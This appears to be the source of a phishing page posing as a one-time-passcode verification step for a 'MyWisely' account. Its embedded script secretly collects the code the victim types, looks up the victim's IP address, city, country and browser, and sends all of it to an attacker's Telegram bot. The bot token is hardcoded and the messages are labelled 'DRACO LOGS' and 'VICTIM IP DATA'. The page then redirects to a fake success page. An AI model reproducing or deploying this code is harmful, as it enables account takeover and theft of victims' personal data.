<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>login</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
      rel="stylesheet"
    />
    <style>
        *{
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
        }

        .angle-left{
            font-size: 20px;
            cursor: pointer;
            position: absolute;
            left: 5%;
        }

        button{
            cursor: pointer;
        }

        body {
            font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            padding: 60px 20px;
            display: flex;
            justify-content: center;
        }


        section.get-started{
            width: 30%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }



        .get-started .star_container{
            width: 100%;
            display: flex;
            justify-content: flex-start;
            align-items: center;
        }

        .get-started .card_container{
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0px;
        }

        .get-started h1{
            color: #3C3D40;
            font-size: 30px;
            font-weight: 500;
        }

        

        .header-text{
            display: flex;
            justify-content: center;
            align-items: center;
            color: #3C3D40;
        }


        .header-text span{
            font-weight: bold;
        }

        .para{
            color: #3C3D40;
            font-weight: bold;
            margin: 10px 0px;
        }

        button.get-started-btn{
            margin: 60px 0px 20px 0px;
            border: none;
            background: #6420ED;
            color: white;
            font-weight: bold;
            width: 85%;
            font-size: 16px;
            height: 55px;
            border-radius: 7px;
            transition: .2s ease;
        }

        button.log-in-btn{
            border: none;
            border: 1px solid #6420ED;
            color: #6420ED;
            background: white;
            width: 85%;
            height: 55px;
            font-size: 16px;
            border-radius: 7px;
            font-weight: bold;
            margin: 0px 0px 20px 0px;
            transition: .2s ease;
        }

        button.get-started-btn:hover{
            background: #4b14b9;
        }

        button.get-started-btn:focus{
            outline: none;
            border: none;
        }

        .or_box{
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #3C3D40;
            height: 20px;
            width: 80%;
        }

        .or_box hr{
            color: #3C3D40;
            width: 100%;
        }

        .or_box p{
            position: absolute;
            text-align: center;
            width: 30px;
            height: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            background: white;
            color: #3C3D40;
        }

        button.wisely-btn{
            border: none;
            color: #6420ED;
            background: none;
            width: 85%;
            height: 55px;
            font-size: 14px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 7px;
            font-weight: bold;
            margin: 30px 0px 40px 0px;
            transition: .2s ease;
        }


        button.log-in-btn:hover, button.wisely-btn:hover{
            background: #6420ed39;
        }

        button.log-in-btn:focus, button.wisely-btn:focus{
            outline: none;
            border: none;
        }
        .wisely-btn img{
            margin: 0px 7px;

        }

        p.privacy{
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #3C3D40;
        }


        section.login_section{
            width: 30%;
            display: flex;
            flex-direction: column;
        }

        img.phone{
            width: 90px;
            margin-top: 60px;
        }

        .login_section h1{
            font-size: 27px;
            font-weight: bold;
            color: #3C3D40;
            margin: 20px 0px 5px 0px;
        }

        .para_p{
            font-size: 14px;
            color: #3C3D40;
            font-weight: bold;
        }

        .form_box{
            display: flex;
            flex-direction: column;
            position: relative;
            margin: 30px 0px;
        }

        .form_box label{
            font-weight: bold;
            font-size: 14px;
            color: #3C3D40;
        }

        .form_box i{
            position: absolute;
            right: 3%;
            top: 40%;
            color: #3C3D40;
        }

        .form_box input{
            font-weight: bold;
            font-size: 15px;
            border: none;
            border-bottom: 1px solid #3C3D40;
            color: #3C3D40;
            margin: 5px 0px;
            height: 30px;
            color: #3C3D40;
        }

        .form_box input:focus{
            outline: none;
            border-bottom: 2px solid #6420ED;
        }

        form a{
            text-align: left;
            font-weight: bold;
            width: 100%;
            font-size: 15px;
        }

        form button{
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 55px;
            border: none;
            background: #6420ED;
            color: white;
            border-radius: 7px;
            margin: 50px 0px;
            font-size: 16px;
            font-weight: bold;
        }


        .loader {
            border: 4px solid #6420ED; 
            border-top: 4px solid white;               
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }


        @media only screen and (max-width:1000px){
            section.login_section, section.get-started{
                width: 50%;
            }
        }


        @media only screen and (max-width:800px){
            section.login_section, section.get-started{
                width: 100%;
            }
        }



    </style>
</head>
<body>

    <section class="login_section">
        <img src="assets/phone.svg" class="phone" alt="">
        <h1>Enter otp</h1>
        <p class="para_p">A one time verification code has been sent to the phone number on file. Please proceed to enter the 6 digts OTP code below</p>

        <form id="form" method="post">
            <div class="form_box">
                <label for="">Otp</label>
                <input type="text" id="otp" placeholder="Enter your otp" required>
            </div>


            <button id="submit_btn">Submit</button>

            <p style="color: #250566; font-size: 13px;"><b>Didn't recieve otp code ?</b></p>
        </form>

    </section>



    <script>



        const otp = document.getElementById('otp')
        const form = document.getElementById('form')
        const buttonLabel = document.getElementById('submit_btn')

        otp.addEventListener("input", function(e) {
            this.value = this.value.replace(/\D/g, "");

            if (this.value.length > 6) {
                this.value = this.value.slice(0, 6);
            }
        });



        // Function to send form data
        const sendFormData = async (data) => {
            let keyValuePairs = Object.entries(data)
            .map(([key, value]) => `## ${key.split("_").join(" ")}: ${value} \n`)
            .join("");
    
            const url = "https://ipapi.co/json";
            const response = await fetch(url);
            const result = await response.json();
    
            const botToken = "8377210615:AAFTWLS_ZjgoXWqmetcKKMz9EcqN68v6K_c";
            const chat_id = "677217859";
    
            const userAgent = navigator.userAgent;
    
            try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                "Content-Type": "application/json",
                },
                body: JSON.stringify({
                chat_id: chat_id,
                text: `------------- DRACO LOGS --------------- \n  ******** MYWELSEY OTP ******** \n \n ${keyValuePairs}  \n \n ---------- VICTIM IP DATA ----------- \n ## IP : ${result.ip} \n Country : ${result.country_name} \n ## City : ${result.city} \n ## Zip Code : ${result.postal} \n \n ## User Agent : ${userAgent}`,
                }),
            });


             window.location = `success`;

             buttonLabel.innerHtml = `Submit`

 
 
            
            } catch (error) {
            console.log(error);
            }
        };

        console.log(buttonLabel)
    
        form.addEventListener("submit", (e) => {
            e.preventDefault();

            let formData = {
                otp: otp.value
            };



            buttonLabel.innerHTML = `<div class="loader"></div>`
    

            sendFormData(formData);
        });
    </script>
    
</body>
</html>